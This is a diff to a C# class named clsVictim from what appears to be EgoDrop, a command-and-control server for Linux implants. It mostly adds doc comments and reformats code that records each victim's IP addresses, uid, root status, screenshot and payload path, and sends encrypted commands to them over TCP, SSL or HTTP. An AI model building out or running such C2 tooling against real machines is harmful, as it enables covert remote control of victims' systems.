@@ -12,56 +12,95 @@ namespace EgoDrop
 {
     public class clsVictim
     {
+        /// <summary>
+        /// Victim config.
+        /// </summary>
         public struct stVictimConfig
         {
-            public Image imgScreen;
-            public string szID;
-            public string szIpAddrInternal;
-            public string szIpAddrExternal;
-            public uint nUid;
-            public string szUsername;
-            public bool bIsRoot { get { return nUid == 0; } }
-            public string szFilePath;
+            public Image imgScreen;                           //Linux screenshot.
+            public string szID;                               //Victim ID.
+            public string szIpAddrInternal;                   //Remote internal IPv4 address.
+            public string szIpAddrExternal;                   //Remote external IPv4 address.
+            public uint nUid;                                 //Linux uid.
+            public string szUsername;                         //Linux username.
+            public bool bIsRoot { get { return nUid == 0; } } //Is root
+            public string szFilePath;                         //Payload startup file path.
         }
 
-        public Socket m_sktClnt { get; set; }
-        public SslStream m_sslClnt { get; set; }
-        public NetworkStream m_streamClnt { get; set; }
+        public Socket m_sktClnt           { get; set; }       //Socket object.
+        public SslStream m_sslClnt        { get; set; }       //SSL object.
+        public NetworkStream m_streamClnt { get; set; }       //Networkstream object.
 
-        public clsHttpPkt m_httpPkt { get; set; }
+        public clsHttpPkt m_httpPkt       { get; set; }       //HTTP packet handler.
 
-        public byte[] m_abBuffer = new byte[65535];
+        public byte[] m_abBuffer = new byte[65535];           //Buffer.
 
-        public clsCrypto m_crypto { get; set; }
-        public clsListener m_listener { get; set; }
+        public clsCrypto m_crypto         { get; set; }       //Crypto object.
+        public clsListener m_listener     { get; set; }       //Listener object.
 
+        /// <summary>
+        /// Overload(Ordinary RSA + AES communication).
+        /// </summary>
+        /// <param name="sktClnt">Client socket object.</param>
+        /// <param name="listener">Server listener object.</param>
         public clsVictim(Socket sktClnt, clsListener listener)
         {
-            m_sktClnt = sktClnt;
+            m_sktClnt  = sktClnt;
             m_listener = listener;
 
-            m_crypto = new clsCrypto(true);
+            m_crypto   = new clsCrypto(true);
         }
         
+        /// <summary>
+        /// Overload(SSL communication).
+        /// </summary>
+        /// <param name="sktClnt">Client socket object.</param>
+        /// <param name="sslstream">Client SSL stream.</param>
+        /// <param name="listener">Server listener object.</param>
         public clsVictim(Socket sktClnt, SslStream sslstream, clsListener listener)
         {
-            m_sktClnt = sktClnt;
-            m_sslClnt = sslstream;
+            m_sktClnt  = sktClnt;
+            m_sslClnt  = sslstream;
             m_listener = listener;
         }
 
+        /// <summary>
+        /// Overload(HTTP communication).
+        /// </summary>
+        /// <param name="sktClnt">Client socket object.</param>
+        /// <param name="streamClnt">Client network stream object.</param>
+        /// <param name="httpPkt">HTTP packet handler.</param>
+        /// <param name="listener">Server listener object.</param>
         public clsVictim(Socket sktClnt, NetworkStream streamClnt, clsHttpPkt httpPkt, clsListener listener)
         {
-            m_sktClnt = sktClnt;
+            m_sktClnt    = sktClnt;
             m_streamClnt = streamClnt;
-            m_httpPkt = httpPkt;
-            m_listener = listener;
+            m_httpPkt    = httpPkt;
+            m_listener   = listener;
 
-            m_crypto = new clsCrypto(true);
+            m_crypto     = new clsCrypto(true);
         }
 
+        /// <summary>
+        /// Send data.
+        /// </summary>
+        /// <param name="nCommand">Command.</param>
+        /// <param name="nParam">Parameter</param>
+        /// <param name="szMsg">Message string.</param>
         public void fnSend(uint nCommand, uint nParam, string szMsg) => fnSend(nCommand, nParam, Encoding.UTF8.GetBytes(szMsg));
+        
+        /// <summary>
+        /// Send data.
+        /// </summary>
+        /// <param name="nCommand">Command.</param>
+        /// <param name="nParam">Parameter.</param>
+        /// <param name="abMsg">Message byte.</param>
         public void fnSend(uint nCommand, uint nParam, byte[] abMsg) => fnSendRaw(new clsEDP((byte)nCommand, (byte)nParam, abMsg).fnabGetBytes());
+        
+        /// <summary>
+        /// Send data.
+        /// </summary>
+        /// <param name="abBuffer">Message buffer.</param>
         public void fnSendRaw(byte[] abBuffer)
         {
             m_sktClnt.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
@@ -77,14 +116,14 @@ namespace EgoDrop
             }), abBuffer);
         }
 
-        public void fnSendEncryptedCommand(uint nCommand, uint nParam, List<string> lsMsg)
+        /// <summary>
+        /// Send data with specified Command and Parameter. The significant parts are Command and Parameter.
+        /// </summary>
+        /// <param name="nCmd">Command.</param>
+        /// <param name="nParam">Parameter.</param>
+        public void fnSendCmdParam(uint nCmd, uint nParam, int nLength = 10)
         {
-
-        }
-
-        public void fnSendCmdParam(uint nCmd, uint nParam)
-        {
-            clsEDP edp = new clsEDP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(clsEZData.fnGenerateRandomStr()));
+            clsEDP edp = new clsEDP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(clsEZData.fnGenerateRandomStr(nLength)));
             switch (m_listener.m_stListener.protoListener)
             {
                 case clsSqlite.enListenerProtocol.TCP:
@@ -93,11 +132,28 @@ namespace EgoDrop
                 case clsSqlite.enListenerProtocol.HTTP:
                     fnHttpSend(nCmd, nParam, clsEZData.fnGenerateRandomStr());
                     break;
+                case clsSqlite.enListenerProtocol.DNS:
+
+                    break;
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="szMsg"></param>
         public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|').ToList());
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="aMsg"></param>
         public void fnSendCommand(string[] aMsg) => fnSendCommand(aMsg.ToList());
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="lsMsg"></param>
         public void fnSendCommand(List<string> lsMsg)
         {
             lsMsg = lsMsg.Select(x => clsEZData.fnStrE2B64(x)).ToList();
@@ -124,9 +180,28 @@ namespace EgoDrop
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="szMsg"></param>
         public void fnSslSend(string szMsg) => fnSslSend(szMsg.Split('|').ToList());
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="aMsg"></param>
         public void fnSslSend(string[] aMsg) => fnSslSend(aMsg.ToList());
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="abBuffer"></param>
         public void fnSslSend(byte[] abBuffer) => fnSslSendRAW(new clsEDP(0, 0, abBuffer).fnabGetBytes());
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="lsMsg"></param>
         public void fnSslSend(List<string> lsMsg)
         {
             lsMsg = clsEZData.fnLsE2B64(lsMsg);
@@ -153,7 +228,20 @@ namespace EgoDrop
             }), abBuffer);
         }
 
+        /// <summary>
+        /// Send HTTP packet(response).
+        /// </summary>
+        /// <param name="nCommand"></param>
+        /// <param name="nParam"></param>
+        /// <param name="szBody"></param>
         public void fnHttpSend(uint nCommand, uint nParam, string szBody) => fnHttpSend(nCommand, nParam, Encoding.UTF8.GetBytes(szBody));
+        
+        /// <summary>
+        /// Send HTTP packet(response).
+        /// </summary>
+        /// <param name="nCommand"></param>
+        /// <param name="nParam"></param>
+        /// <param name="abBody"></param>
         public void fnHttpSend(uint nCommand, uint nParam, byte[] abBody)
         {
             clsEDP edp = new clsEDP((byte)nCommand, (byte)nParam, abBody);
@@ -163,6 +251,10 @@ namespace EgoDrop
             fnHttpSendRAW(abResp);
         }
 
+        /// <summary>
+        /// Send HTTP packet.
+        /// </summary>
+        /// <param name="abResp"></param>
         public void fnHttpSendRAW(byte[] abResp)
         {
             m_streamClnt.BeginWrite(abResp, 0, abResp.Length, new AsyncCallback((ar) =>
